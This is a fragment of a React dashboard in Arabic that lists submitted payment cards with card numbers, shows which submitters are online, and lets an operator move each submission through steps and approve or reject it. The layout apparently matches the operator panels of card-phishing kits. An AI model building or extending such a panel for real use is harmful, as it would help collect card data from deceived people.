              >
                <LogOut className="mr-3 h-4 w-4" />
                تسجيل الخروج
              </Button>
            </nav>
          </div>
        </SheetContent>
      </Sheet>

      {/* Settings panel */}
      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />

      {/* Export dialog */}
      <ExportDialog open={exportDialogOpen} onOpenChange={setExportDialogOpen} notifications={filteredNotifications} />

      <header className="sticky top-0 z-50 border-b border-gray-200/50 dark:border-gray-700/50 bg-white/80 dark:bg-gray-900/80 backdrop-blur-xl supports-[backdrop-filter]:bg-white/60 dark:supports-[backdrop-filter]:bg-gray-900/60 shadow-sm">
        <div className="flex items-center justify-between p-6">
          <div className="flex items-center gap-6">
            <Button
              variant="ghost"
              size="icon"
              className="md:hidden h-10 w-10 rounded-xl hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200"
              onClick={() => setMobileMenuOpen(true)}
            >
              <Menu className="h-5 w-5" />
            </Button>
            <div className="flex items-center gap-4">
              <div className="relative">
                <div className="bg-gradient-to-br from-blue-500 via-blue-600 to-blue-700 p-4 rounded-2xl shadow-lg ring-1 ring-blue-500/20">
                  <Bell className="h-6 w-6 text-white" />
                </div>
                {pendingCount > 0 && (
                  <div className="absolute -top-2 -right-2 bg-gradient-to-r from-red-500 to-red-600 text-white text-xs font-bold rounded-full h-6 w-6 flex items-center justify-center shadow-lg ring-2 ring-white dark:ring-gray-900 animate-pulse">
                    {pendingCount}
                  </div>
                )}
              </div>
              <div>
                <h1 className="text-2xl font-bold bg-gradient-to-r from-gray-900 via-gray-800 to-gray-700 dark:from-white dark:via-gray-100 dark:to-gray-200 bg-clip-text text-transparent">
                  لوحة الإشعارات المتقدمة
                </h1>
                <p className="text-sm text-gray-500 dark:text-gray-400 font-medium">
                  آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}
                </p>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={handleRefresh}
                    className="relative overflow-hidden bg-transparent h-10 w-10 rounded-xl hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200"
                  >
                    <RefreshCw className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`} />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>تحديث البيانات</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <div className="hidden md:flex items-center gap-3">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="icon"
                      onClick={() => setSettingsOpen(true)}
                      className="h-10 w-10 rounded-xl hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200"
                    >
                      <Settings className="h-4 w-4" />
                      <span className="sr-only">الإعدادات</span>
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>الإعدادات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="icon"
                      onClick={() => setExportDialogOpen(true)}
                      className="h-10 w-10 rounded-xl hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200"
                    >
                      <Download className="h-4 w-4" />
                      <span className="sr-only">تصدير</span>
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تصدير البيانات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
            </div>
          </div>
        </div>
      </header>

      {/* Main content */}
      <div className="p-6">
        <div className="flex items-center justify-between mb-6">
          <SearchBar onSearch={handleSearch} />
          <div className="flex items-center gap-4">
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="outline" size="sm">
                  <ArrowUpDown className="mr-2 h-4 w-4" />
                  ترتيب حسب
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent className="w-[150px]">
                <DropdownMenuLabel>ترتيب حسب</DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={() => setSortBy("date")}>التاريخ</DropdownMenuItem>
                <DropdownMenuItem onClick={() => setSortBy("status")}>الحالة</DropdownMenuItem>
                <DropdownMenuItem onClick={() => setSortBy("country")}>البلد</DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
            <Button variant="outline" size="sm" onClick={() => setSortOrder(sortOrder === "asc" ? "desc" : "asc")}>
              {sortOrder === "asc" ? "تصاعدي" : "تنازلي"}
            </Button>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-6">
          <StatisticsCard
            title="الزوار"
            value={totalVisitorsCount}
            change="+10%"
            changeType="increase"
            icon={Users}
            color="bg-gradient-to-br from-blue-500 to-blue-600"
            trend={visitorTrend}
          />
          <StatisticsCard
            title="البطاقات"
            value={cardSubmissionsCount}
            change="+5%"
            changeType="increase"
            icon={CreditCard}
            color="bg-gradient-to-br from-green-500 to-green-600"
            trend={cardTrend}
          />
          <StatisticsCard
            title="متصلون"
            value={onlineUsersCount}
            change="+2%"
            changeType="increase"
            icon={UserCheck}
            color="bg-gradient-to-br from-yellow-500 to-yellow-600"
            trend={onlineTrend}
          />
          <StatisticsCard
            title="الموافقة"
            value={approvedCount}
            change="+3%"
            changeType="increase"
            icon={CheckCircle}
            color="bg-gradient-to-br from-emerald-500 to-emerald-600"
            trend={approvedTrend}
          />
        </div>

        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-4">
            <Button
              variant="outline"
              size="sm"
              onClick={() => setFilterType("all")}
              className={filterType === "all" ? "bg-primary text-primary-foreground" : ""}
            >
              الكل
            </Button>
            <Button
              variant="outline"
              size="sm"
              onClick={() => setFilterType("card")}
              className={filterType === "card" ? "bg-primary text-primary-foreground" : ""}
            >
              البطاقات
            </Button>
            <Button
              variant="outline"
              size="sm"
              onClick={() => setFilterType("online")}
              className={filterType === "online" ? "bg-primary text-primary-foreground" : ""}
            >
              المتصلون
            </Button>
          </div>
          <Pagination
            currentPage={currentPage}
            totalPages={totalPages}
            onPageChange={handlePageChange}
            totalItems={filteredNotifications.length}
            itemsPerPage={itemsPerPage}
          />
        </div>

        <div className="space-y-4">
          {paginatedNotifications.map((notification) => (
            <Card key={notification.id} className="border border-gray-200/50 dark:border-gray-700/50">
              <CardHeader className="flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <Avatar>
                    <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                    <AvatarFallback className="bg-primary text-primary-foreground font-semibold">M</AvatarFallback>
                  </Avatar>
                  <div>
                    <p className="text-sm font-medium text-gray-500 dark:text-gray-400">
                      {notification.name || "بدون اسم"}
                    </p>
                    <p className="text-lg font-bold text-gray-900 dark:text-white">{notification.email}</p>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                
                  <UserStatus userId={notification.id} />
                </div>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between">
                  <p className="text-sm font-medium text-gray-500 dark:text-gray-400">
                    البطاقة: {notification.cardNumber}
                  </p>
                  <p className="text-sm font-medium text-gray-500 dark:text-gray-400">الحالة: {notification.status}</p>
                </div>
                <div className="flex items-center justify-between">
                  <p className="text-sm font-medium text-gray-500 dark:text-gray-400">
                    البلد: {notification.country || "بدون بلد"}
                  </p>
                  <p className="text-sm font-medium text-gray-500 dark:text-gray-400">
                    تاريخ الإنشاء: {formatDistanceToNow(new Date(notification.createdDate), { locale: ar })}
                  </p>
                </div>
              </CardContent>
              <CardFooter className="flex items-center justify-between">
                <div className="flex items-center gap-4">
                  {stepButtons.map((button) => (
                    <Button
                      key={button.step}
                      variant="outline"
                      size="sm"
                      onClick={() => handleStepUpdate(notification.id, button.step)}
                      className={notification.step === button.step ? "bg-primary text-primary-foreground" : ""}
                    >
                      {button.label}
                    </Button>
                  ))}
                </div>
                <div className="flex items-center gap-4">
                  <Button variant="outline" size="sm" onClick={() => handleApproval("approved", notification.id)}>
                    موافقة
                  </Button>
                  <Button variant="outline" size="sm" onClick={() => handleApproval("rejected", notification.id)}>
                    رفض
                  </Button>
                  <Button variant="outline" size="sm" onClick={() => handleDelete(notification.id)}>
                    مسح
                  </Button>
                </div>
              </CardFooter>
            </Card>
          ))}
        </div>
      </div>
    </div>
  )
}
